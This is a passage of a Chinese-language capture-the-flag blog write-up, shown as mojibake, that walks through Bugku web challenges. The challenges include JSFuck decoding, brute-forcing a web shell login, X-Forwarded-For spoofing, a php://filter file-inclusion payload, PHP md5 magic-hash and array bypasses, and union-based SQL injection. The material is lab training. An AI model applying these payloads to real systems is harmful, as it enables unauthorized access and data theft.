<li>$_ENV [ æ˜¯ä¸€ä¸ªåŒ…å«æœåŠ¡å™¨ç«¯ç¯å¢ƒå˜é‡çš„æ•°ç»„ã€‚å®ƒæ˜¯PHPä¸­ä¸€ä¸ªè¶…çº§å…¨å±€å˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨PHP ç¨‹åºçš„ä»»ä½•åœ°æ–¹ç›´æ¥è®¿é—®å®ƒ]</li>
</ul>
</blockquote>
<p>æˆ‘ä»¬è¿™é‡Œä½¿ç”¨GLOBALSå…¨å±€å˜é‡è¿›è¡Œæ„é€ </p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E5%8F%98%E9%87%8F1/EW%7BSV%7B4D%29ZL3L~CLXXN4M%25Q.png" alt=""></p>
<p>okï¼Œå›æ˜¾å‡ºflagã€‚</p>
</li>
<li>
<h2 id="web5"><a class="header-anchor" href="#web5">Â¶</a>web5</h2>
<p>æ‰“å¼€é¡µé¢æç¤ºæ˜¯jsfuckåŠ å¯†</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web5/S%24E92B%60%7BE%24X%29T1UC%28%400H%24FG.png" alt=""></p>
<p>æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°ä¸€å †ç¼–ç å‡ºç°åœ¨æˆ‘ä»¬é¢å‰</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web5/G%2444%402T5FQDV%25%7DF8OY%28M1AS.png" alt=""></p>
<p>jsfuckå…¶å®æ˜¯ä¸€ä¸²jsä»£ç ï¼Œç»è¿‡äº†ç‰¹æ®Šçš„ç¼–å†™æ–¹å¼ï¼ŒæŠŠåŒ…å«çš„å­—ç¬¦åšåˆ°æè‡´ï¼Œæœ€ååªå‰©ä¸‹ ()+[]!  è¿™å…­ä¸ªå­—ç¬¦ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">false       &#x3D;&gt;  ![]</span><br><span class="line">true        &#x3D;&gt;  !![]</span><br><span class="line">undefined   &#x3D;&gt;  [][[]]</span><br><span class="line">NaN         &#x3D;&gt;  +[![]]</span><br><span class="line">0           &#x3D;&gt;  +[]</span><br><span class="line">1           &#x3D;&gt;  +!+[]</span><br><span class="line">2           &#x3D;&gt;  !+[]+!+[]</span><br><span class="line">10          &#x3D;&gt;  +[[+!+[]]+[+[]]]</span><br><span class="line">Array       &#x3D;&gt;  []</span><br><span class="line">Number      &#x3D;&gt;  +[]</span><br><span class="line">String      &#x3D;&gt;  []+[]</span><br><span class="line">Boolean     &#x3D;&gt;  ![]</span><br><span class="line">Function    &#x3D;&gt;  [][&quot;filter&quot;]</span><br><span class="line">run         &#x3D;&gt;  [][&quot;filter&quot;][&quot;constructor&quot;]( CODE )()</span><br><span class="line">eval        &#x3D;&gt;  [][&quot;filter&quot;][&quot;constructor&quot;](&quot;return eval&quot;)()( CODE )</span><br><span class="line">window      &#x3D;&gt;  [][&quot;filter&quot;][&quot;constructor&quot;](&quot;return this&quot;)()</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥æˆ‘ä»¬å¤åˆ¶ç²˜è´´è¿™ä¸²jsfuckåˆ°æ§åˆ¶å°è¾“å‡ºï¼Œå¾—åˆ°ç»“æœ</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web5/%28JU~1L3FO~6KTRQV886%25%60%40W.png" alt=""></p>
<p>å†æŒ‰é¢˜ç›®æç¤ºçš„ï¼Œè½¬æ¢æˆå¤§å†™çš„å½¢å¼ï¼Œæäº¤å³å¯ã€‚</p>
</li>
<li>
<h2 id="å¤´ç­‰èˆ±"><a class="header-anchor" href="#å¤´ç­‰èˆ±">Â¶</a>å¤´ç­‰èˆ±</h2>
<p>è¿›å»åï¼Œå‘ç°ç¡®å®å’Œé¡µé¢è¯´çš„ä¸€æ ·ï¼Œå•¥ä¿¡æ¯éƒ½æ²¡æœ‰</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E5%A4%B4%E7%AD%89%E8%88%B1/AJH%28INH1G56374%249K6G%29IWB.png" alt=""></p>
<p>å¥½ï¼Œæˆ‘ä»¬æŠ“åŒ…çœ‹çœ‹ï¼Œæœ‰æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E5%A4%B4%E7%AD%89%E8%88%B1/2CWHD%60%25%5BADSG%25H2W%5DYX9H%29Y.png" alt=""></p>
<p>å¥½å§ï¼Œflagè¿™å°±å‡ºæ¥äº†ã€‚</p>
</li>
<li>
<h2 id="ç½‘ç«™è¢«é»‘"><a class="header-anchor" href="#ç½‘ç«™è¢«é»‘">Â¶</a>ç½‘ç«™è¢«é»‘</h2>
<p>æ‰“å¼€ç¯å¢ƒï¼Œæ˜¯ä¸€ä¸ªè¢«æŒ‚äº†é»‘é¡µçš„ç½‘ç«™</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91/QQ%E6%88%AA%E5%9B%BE20201018162409.png" alt=""></p>
<p>æˆ‘ä»¬å…ˆæ‰«ä¸€ä¸‹é¡µé¢ï¼Œçœ‹çœ‹ç•™ä¸‹äº†ä»€ä¹ˆ</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91/UT~3VV~T72FTBD_PXMF3L68.png" alt=""></p>
<p>å‘ç°æœ‰ä¸€ä¸ªshell.phpï¼Œæˆ‘ä»¬å»è®¿é—®ä¸€ä¸‹</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91/I%40OI%250XWBJ%40M5%28X%25QY%286IAC.png" alt=""></p>
<p>å‘ç°æ˜¯ä¸€ä¸ªéœ€è¦ç™»å½•çš„é¡µé¢ï¼Œæˆ‘ä»¬ä½¿ç”¨burpsuiteçˆ†ç ´ä¸€ä¸‹å¯†ç </p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91/2GRA6H%7BML86%7DW%5DM8R7A8%29SR.png" alt=""></p>
<p>çˆ†ç ´å¾—åˆ°å¯†ç ä¸ºhackï¼Œè¾“å…¥å¯†ç ï¼Œå¾—åˆ°flag</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91/T6Z2%25VF%290%7D%2938%5D%7B%7D9PSS%602F.png" alt=""></p>
</li>
<li>
<h2 id="ç®¡ç†å‘˜ç³»ç»Ÿ"><a class="header-anchor" href="#ç®¡ç†å‘˜ç³»ç»Ÿ">Â¶</a>ç®¡ç†å‘˜ç³»ç»Ÿ</h2>
<p>æ‰“å¼€é¡µé¢ï¼Œå‘ç°æ˜¯ä¸€ä¸ªç™»å½•æ¡†ï¼Œå…ˆæŸ¥çœ‹ä¸€ä¸‹æºç ï¼Œæ‰¾æ‰¾æœ‰æ²¡æœ‰ä»€ä¹ˆæç¤º</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F/Z8%40230%7BC%7B6V8GOE7D851%291M.png" alt=""></p>
<p>å‘ç°ä¸€ä¸²base64åŠ å¯†çš„æ•°æ®ï¼Œæˆ‘ä»¬å»è§£å¯†çœ‹çœ‹</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F/B9_3MUJUL493G0Y816ECBR1.png" alt=""></p>
<p>çŒœæµ‹è¿™åº”è¯¥æ˜¯å¯†ç ï¼Œè´¦å·çš„è¯é»˜è®¤adminè¯•è¯•ï¼Œæ¯•ç«Ÿç®¡ç†å‘˜ç³»ç»Ÿå˜›</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F/0MBMGO20DMNSRR1%29%40%5BD85H0.png" alt=""></p>
<p>å‘ç°æç¤ºæˆ‘ä»¬ipç¦æ­¢ç™»é™†ï¼Œåº”è¯¥æ˜¯è¦æŒ‡å®šipï¼Œæœ¬åœ°æœ¬åœ°æœ¬åœ°â€¦emmmï¼Œé‚£æ˜¯æç¤ºæˆ‘ä»¬127.0.0.1å§ï¼Œè¯•è¯•ä¸€æ³¢ã€‚</p>
<p>åŠ ä¸ªX-Forwarded-Forå¤´è¿›å»å‘ä¸€ä¸‹åŒ…</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F/NWQJ4%7D9Y_%40I7B8%5B%25COSZ%25%28Y.png" alt=""></p>
<p>å‘ç°ç™»é™†æˆåŠŸï¼Œflagå›æ˜¾å‡ºæ¥äº†ï¼Œå˜¿å˜¿å˜¿ã€‚</p>
</li>
<li>
<h2 id="web4"><a class="header-anchor" href="#web4">Â¶</a>web4</h2>
<p>è¿›æ¥å°±æç¤ºæˆ‘ä»¬æŸ¥çœ‹æºä»£ç ï¼Œä¸é”™ä¸é”™</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web4/~TO%29FETA5%29%254NP4%7D7Z%29%29%60F2.png" alt=""></p>
<p>ç§»æ­¥å»æºä»£ç ï¼Œå‘ç°jsé‡Œæœ‰ä¸‰ä¸²ç»è¿‡urlç¼–ç çš„æ•°æ®</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web4/E%7BUM%24%408%28ZAX3GGX%7D5TXVB%60R.png" alt=""></p>
<p>æˆ‘ä»¬å»è§£ç åï¼ŒæŠŠè¿™ä¸‰ä¸²è§£å¯†çš„æ•°æ®æ‹¼æ¥èµ·æ¥ï¼Œè¿™é‡Œå»ºè®®å»åœ¨çº¿çš„jsæ ¼å¼ç¾åŒ–ç½‘ç«™è¿›è¡Œæ ¼å¼åŒ–ï¼Œç„¶åå¾—åˆ°</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web4/XVK%24A9MCZ4K%7BWC%28O09K%29J9F.png" alt=""></p>
<p>æˆ‘ä»¬æŠŠè¿™ä¸€ä¸²å­—ç¬¦ä¸²â€œ67d709b2baa648cf6e87a7114f1â€è¾“å…¥æäº¤æ¡†</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web4/%5B%5DT%40%25X0FAPWVTXIR%5DU%5DS%296M.png" alt=""></p>
<p>flagå°±å‡ºæ¥äº†ï¼Œä½†è®©æˆ‘æœ‰ä¸€ç‚¹ç‚¹è¿·æƒ‘ï¼ŒæŒ‰jsä»£ç é‡Œè¯´åº”è¯¥è·å–çš„æ˜¯idä¸ºpasswordé‡Œçš„å€¼ï¼Œä½†æˆ‘ä»¬åˆšåˆšçœ‹æºä»£ç ï¼Œæäº¤æ¡†çš„idæ˜¯flagâ€¦æ¥è‡ªèœé¸¡çš„è¿·æƒ‘ã€‚</p>
</li>
<li>
<h2 id="flagåœ¨indexé‡Œ"><a class="header-anchor" href="#flagåœ¨indexé‡Œ">Â¶</a>flagåœ¨indexé‡Œ</h2>
<p>æ‰“å¼€é¡µé¢ï¼Œåªæœ‰ä¸€ä¸ªé“¾æ¥ç‚¹å‡»</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/flag%E5%9C%A8index%E9%87%8C/U5%5D7%7B%406A_%2421B%2946Q%5BR%60%4033.png" alt=""></p>
<p>ç‚¹å¼€è¿æ¥åæ˜¾ç¤ºä¸€ä¸ªæ–‡æœ¬ï¼ŒæŸ¥çœ‹äº†æºç å‘ç°æ²¡æœ‰ä»€ä¹ˆä¿¡æ¯</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/flag%E5%9C%A8index%E9%87%8C/%5B%29F%40DM%5B9%409W%7B92XX%29XQFEAD.png" alt=""></p>
<p>æ³¨æ„åˆ°urlæœ‰ä¸ªfileå‚æ•°ï¼ŒçŒœä¸€æ³¢æ–‡ä»¶åŒ…å«ã€‚</p>
<p>ä½¿ç”¨phpåè®®è¿›è¡Œè¯»å–ï¼šfile=php://filter/read=convert.base64-encode/resource=index.php</p>
<p>å…ˆå¯¹è¿™ä¸ªåè®®è¿›è¡Œä¸€æ³¢è§£é‡Šï¼š</p>
<blockquote>
<p>fileè¿›è¡Œgetä¼ å‚ï¼Œé¢˜ç›®å‰é¢æç¤ºæˆ‘ä»¬çš„index.phpï¼Œphp://filter/æ˜¯è®¿é—®æœ¬åœ°æ–‡ä»¶çš„åè®®ï¼Œreadè¡¨ç¤ºè¦è¯»å–çš„é“¾çš„ç­›é€‰åˆ—è¡¨ï¼Œresourceè¡¨ç¤ºè®¿é—®çš„ç›®æ ‡æ–‡ä»¶ã€‚</p>
<p>ä¸ºä»€ä¹ˆä¸­é—´è¦è¿›è¡Œä¸€æ³¢base64åŠ å¯†å‘¢ï¼Ÿå› ä¸ºä¸è¿›è¡Œbase64åŠ å¯†ï¼Œä¼šç›´æ¥å½“æˆphpæ–‡ä»¶æ‰§è¡Œã€‚è€Œæˆ‘ä»¬ä¼ é€’çš„å‚æ•°è¢«include()å‡½æ•°å¼•å…¥äº†base64çš„æ ¼å¼ï¼Œæ‰§è¡Œä¸æˆåŠŸï¼Œæ‰€ä»¥ä¼šè¿”å›æ–‡ä»¶çš„æºç ã€‚</p>
</blockquote>
<p>ä½¿ç”¨phpæ–‡ä»¶åè®®åï¼Œé¡µé¢è¿”å›ä¸€ä¸²è¢«base64åŠ å¯†çš„æºç </p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/flag%E5%9C%A8index%E9%87%8C/C5TYJ8CEF%29N%5DM%60%5BNNNC%60W%5B5.png" alt=""></p>
<p>è§£å¯†base64ä¹‹åå¾—åˆ°</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/flag%E5%9C%A8index%E9%87%8C/C_%7DDCAG%5B2RL2BJM%40Z4SN3VI.png" alt=""></p>
<p>å‘ç°flagè—åœ¨æ³¨é‡Šä¸­ï¼Œé—¯å…³æˆåŠŸï¼</p>
</li>
<li>
<h2 id="è¾“å…¥å¯†ç æŸ¥çœ‹flag"><a class="header-anchor" href="#è¾“å…¥å¯†ç æŸ¥çœ‹flag">Â¶</a>è¾“å…¥å¯†ç æŸ¥çœ‹flag</h2>
<p>è¿›æ¥æ˜¯ä¸€ä¸ªè¾“å…¥å¯†ç çš„ç™»é™†æ¡†</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8Bflag/S%25XM%289XXWB3O%24H%28%7DJEJUA%5D5.png" alt=""></p>
<p>è€è§„çŸ©ã€‚æŒ‰ç…§é¢˜ç›®æç¤ºï¼Œä½¿ç”¨burpsuiteæŠ“åŒ…çˆ†ç ´å¯†ç </p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8Bflag/_SB%40QY%24%7B3_O3N_ZXVDJU46I.png" alt=""></p>
<p>å› ä¸ºè¯´çš„5ä½æ•°å­—ï¼Œæ‰€ä»¥æŒ‰10000åˆ°90000çˆ†ç ´è¯•è¯•</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8Bflag/H3S4Q%40C%60VAEF%60EH%28%7DQL3~%7BQ.png" alt=""></p>
<p>å»å†²æ¯ç‰›å¥¶å…ˆâ€¦</p>
<p>okã€‚çˆ†ç ´æˆåŠŸï¼ŒæŸ¥çœ‹responseï¼Œå¾—åˆ°flag</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8Bflag/H3S4Q%40C%60VAEF%60EH%28%7DQL3~%7BQ.png" alt=""></p>
</li>
<li>
<h2 id="ç‚¹å‡»ä¸€ç™¾ä¸‡æ¬¡"><a class="header-anchor" href="#ç‚¹å‡»ä¸€ç™¾ä¸‡æ¬¡">Â¶</a>ç‚¹å‡»ä¸€ç™¾ä¸‡æ¬¡</h2>
<p>å¥½å®¶ä¼™ï¼Œåˆæ˜¯ä¸€é“é“¾æ¥æŒ‚æ‰çš„é¢˜ç›®ï¼Œå¾…ç»­â€¦</p>
</li>
<li>
<h2 id="å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯"><a class="header-anchor" href="#å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯">Â¶</a>å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯</h2>
<p>æ‰“å¼€é¡µé¢æ˜¯ä¸€ä¸²å­—ç¬¦ä¸²ï¼Œæ²¡çœ‹æ‡‚å•¥æ„æ€</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/NPU2G0NO%29~UHHH%7D%24P%29HJZ2U.png" alt=""></p>
<p>æŒ‰ç…§é¢˜ç›®æç¤ºï¼Œåº”è¯¥æ˜¯æœ‰å¤‡ä»½æ–‡ä»¶æ³„éœ²ï¼ŒçŒœæµ‹åº”è¯¥æ˜¯å¸¸è§çš„bakæ–‡ä»¶ï¼Œä½¿ç”¨å·¥å…·æ‰«ä¸€ä¸‹</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/%28~%60BF%7DB_%24MW9P%60I%2827BN2ZN.png" alt=""></p>
<p>å‘ç°å­˜åœ¨bakæ–‡ä»¶ï¼Œæˆ‘ä»¬è®¿é—®è¿™ä¸ªè·¯å¾„åï¼Œä¸‹è½½bakæ–‡ä»¶ï¼Œæ‰“å¼€å‡ºç°æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: Norse</span></span><br><span class="line"><span class="comment"> * Date: 2017/8/6</span></span><br><span class="line"><span class="comment"> * Time: 20:22</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line">$str = strstr($_SERVER[<span class="string">&#x27;REQUEST_URI&#x27;</span>], <span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">$str = substr($str,<span class="number">1</span>);</span><br><span class="line">$str = str_replace(<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$str);</span><br><span class="line">parse_str($str);</span><br><span class="line"><span class="keyword">echo</span> md5($key1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> md5($key2);</span><br><span class="line"><span class="keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag.<span class="string">&quot;å–å¾—flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>æºç æ„æ€æ˜¯ï¼Œå¯¹keyè¿›è¡Œä¸€ä¸ªè¿‡æ»¤ï¼Œç„¶åä¼ å‚key1å’Œkey2ä¸¤ä¸ªå‚æ•°ï¼ŒåŒæ—¶key1å’Œkey2çš„md5å€¼è¦ç›¸ç­‰ï¼Œå¹¶ä¸”æœªç»è¿‡md5åŠ å¯†å‰çš„å€¼ä¸èƒ½ç›¸ç­‰ï¼Œæ»¡è¶³æ¡ä»¶å°±ä¼šè¾“å‡ºflagã€‚</p>
<p>å¯¹äºkeyè¿‡æ»¤æˆ‘ä»¬å¯ä»¥è€ƒè™‘ä½¿ç”¨åŒå†™çš„æ–¹æ³•ï¼Œkkeyey1</p>
<p>è¿™é‡Œè¯´ä¸€ä¸‹å¯ä»¥åˆ©ç”¨==æ¼æ´å’Œæ•°ç»„æ¼æ´ç»•è¿‡md5</p>
<p><strong>==æ¼æ´ï¼š</strong></p>
<blockquote>
<p>å¦‚æœä¸¤ä¸ªå­—ç¬¦ç»MD5åŠ å¯†åçš„å€¼ä¸º 0exxxxxå½¢å¼ï¼Œå°±ä¼šè¢«è®¤ä¸ºæ˜¯ç§‘å­¦è®¡æ•°æ³•ï¼Œä¸”è¡¨ç¤ºçš„æ˜¯0*10çš„xxxxæ¬¡æ–¹ï¼Œè¿˜æ˜¯é›¶ï¼Œéƒ½æ˜¯ç›¸ç­‰çš„ã€‚</p>
<p>ä¸‹åˆ—çš„å­—ç¬¦ä¸²çš„MD5å€¼éƒ½æ˜¯0eå¼€å¤´çš„ï¼š</p>
<p>QNKCDZO</p>
<p>240610708</p>
<p>s878926199a</p>
<p>s155964671a</p>
<p>s214587387a</p>
<p>s214587387a</p>
</blockquote>
<p><strong>æ•°ç»„æ¼æ´ï¼š</strong></p>
<p>md5()å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ï¼Œå¦‚æœæˆ‘ä»¬ä¼ æ•°ç»„è¿›å»ï¼Œä¼šè¿”å›ä¸€ä¸ªNULLï¼Œæ‰€ä»¥ä¸¤ä¸ªæ•°ç»„ç»è¿‡åŠ å¯†åå¾—åˆ°çš„éƒ½æ˜¯ç›¸åŒçš„NULLã€‚</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/JE36DTP5PN~GP5EA2POZ%28YI.png" alt=""></p>
<p>okï¼ŒæˆåŠŸç»•è¿‡ï¼Œå–å¾—flagã€‚</p>
</li>
<li>
<h2 id="æˆç»©å•"><a class="header-anchor" href="#æˆç»©å•">Â¶</a>æˆç»©å•</h2>
<p><strong>æ‰‹å·¥æ³¨å…¥ï¼š</strong></p>
<p>æ ¹æ®é¡µé¢å†…å®¹ï¼Œè¿˜æœ‰è¾“å…¥æ¡†çš„æç¤º1,2,3ï¼ŒçŒœæµ‹åº”è¯¥æ˜¯sqlæ³¨å…¥çš„ç±»å‹ï¼Œå°è¯•ä¼ å‚ä¸€ä¸ª1</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/3V6%28G84T%29H%5BA_Z_%24%7B%25NG%7BSH.png" alt=""></p>
<p>æœ‰å›æ˜¾ï¼Œå†åŠ ä¸ªâ€™å·æµ‹è¯•æµ‹è¯•</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/%29FK7%5DYXUELQ96IWRV_V8%7DML.png" alt=""></p>
<p>å‘ç°æ²¡æœ‰å›æ˜¾ï¼ŒåŠ ä¸€ä¸ªæ³¨é‡Šè¯•è¯•</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/BJT40REGPF%7D2%5D19_N_S%25K07.png" alt=""></p>
<p>æœ‰æ•°æ®å›æ˜¾ï¼Œåˆ¤å®šæ˜¯å­˜åœ¨sqlæ³¨å…¥ï¼Œæˆ‘ä»¬æŸ¥æŸ¥åº”è¯¥æœ‰å¤šå°‘åˆ—ï¼Œå…¶å®çœ‹ç½‘é¡µæ˜¾ç¤ºçš„æ•°æ®ï¼Œå°±èƒ½çœ‹å‡ºæ˜¯4åˆ—äº†ï¼Œä½†è¿˜æ˜¯æµ‹è¯•ä¸€ä¸‹ï¼Œå…å¾—åˆ¤æ–­é”™è¯¯</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/Q%28CQDWU%7D%5DFT%60%25%24H8%25AK8B%5BB.png" alt=""></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/HX%292DBLC3G%603~%5D%28%5D5KWB%254L.png" alt=""></p>
<p>å‘ç°ä¸º4æ—¶æœ‰å›æ˜¾æ•°æ®ï¼Œä¸º5æ—¶æ²¡æœ‰æ•°æ®å›æ˜¾ï¼Œåˆ¤æ–­æœ‰4åˆ—</p>
<p>é‚£æˆ‘ä»¬ç›´æ¥æ¥å°è¯•è”åˆæ³¨å…¥ï¼ŒæŸ¥æŸ¥æ•°æ®åº“åå­—ï¼Œè¿™é‡Œè®°å¾—è¦å†™æˆid=-1â€™ï¼ŒæŠŠå‰é¢æŸ¥è¯¢çš„æ•°æ®ç½®ç©ºï¼Œå½“ç„¶id=0ä¹Ÿæ˜¯å¯ä»¥çš„</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/I6M%7DB2QK6WB4MF3ILV_WMRG.png" alt=""></p>
<p>æŸ¥å‡ºæ•°æ®åº“çš„åå­—ä¸ºï¼šskctf_flag</p>
<p>ç»§ç»­æŸ¥è¡¨åå­—</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/%28CVZ%7D%5D97KJW5_%40GLWYO_O%24S.png" alt=""></p>
<p>æŸ¥å‡ºæœ‰ä¸¤ä¸ªè¡¨ï¼Œåˆ†åˆ«ä¸ºfl4gå’Œscï¼Œæˆ‘ä»¬å…ˆæŸ¥è¡¨ä¸ºfl4gçš„åˆ—å</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/V12W79PWN~1R%25~FUWXJEC%5BF.png" alt=""></p>
<p>å¾—åˆ°åˆ—åä¸ºskctf_flagï¼Œä¸‹ä¸€æ­¥æŸ¥çœ‹åˆ—é‡Œé¢çš„æ•°æ®</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/3Z1HO%7BD%40J%5B%24NINEOQ4SWQ7T.png" alt=""></p>
<p>okï¼Œçˆ†å‡ºflagäº†ï¼Œå¤§åŠŸå‘Šæˆï¼</p>
<p><strong>ä½¿ç”¨sqlmapå·¥å…·çˆ†ç ´</strong>ï¼š</p>
<p>é¦–å…ˆè¿™æ˜¯ä¸ªpostæ–¹å¼æäº¤çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç”¨burpsuiteè¿›è¡ŒæŠ“å–æ•°æ®åŒ…</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/_T9%5DIEYFI%29%7D3B1ULO69CXNK.png" alt=""></p>
<p>ç„¶åå¤åˆ¶åˆ°æ–‡æœ¬æ–‡ä»¶ä¸Š</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/V_2IY%7D%295REKL6GRA4AMZFCG.png" alt=""></p>
<p>æŸ¥è¯¢æ•°æ®åº“ï¼š</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/ZCI8V7QAV3DBW%60%5B%40J8~_BLP.png" alt=""></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/BJB0ITHDT2EF%28H7Y%29%60ADNMG.png" alt=""></p>
<p>æŸ¥è¯¢è¡¨åï¼š</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/RA5%29I%7DFT%7BV2S%28L87RD%60AD%40O.png" alt=""></p>
<p>æŸ¥è¯¢å­—æ®µåï¼š</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/B~%40I%25~2Z52PR1WEJ5YEC5%7DE.png" alt=""></p>
<p>æŸ¥è¯¢å­—æ®µä¿¡æ¯ï¼š</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E6%88%90%E7%BB%A9%E5%8D%95/PSMH%7DE%25MAI~EMU434%7DLDE%5B2.png" alt=""></p>
</li>
<li>
